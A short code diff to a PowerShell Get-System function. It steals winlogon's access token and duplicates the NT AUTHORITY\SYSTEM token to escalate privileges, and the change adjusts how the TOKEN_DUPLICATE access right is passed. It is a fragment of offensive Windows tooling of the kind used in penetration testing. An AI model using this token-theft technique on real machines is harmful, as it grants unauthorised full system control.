@@ -26,7 +26,7 @@ function Get-System
 
     # Open winlogon's Token with TOKEN_DUPLICATE Acess
     # This allows us to make a copy of the token with DuplicateToken
-    $hToken = OpenProcessToken -ProcessHandle $proc.Handle -DesiredAccess $TOKEN_ACCESS::TOKEN_DUPLICATE
+    $hToken = OpenProcessToken -ProcessHandle $proc.Handle -DesiredAccess TOKEN_DUPLICATE
     
     # Make a copy of the NT AUTHORITY\SYSTEM Token
     $hDupToken = DuplicateToken -TokenHandle $hToken
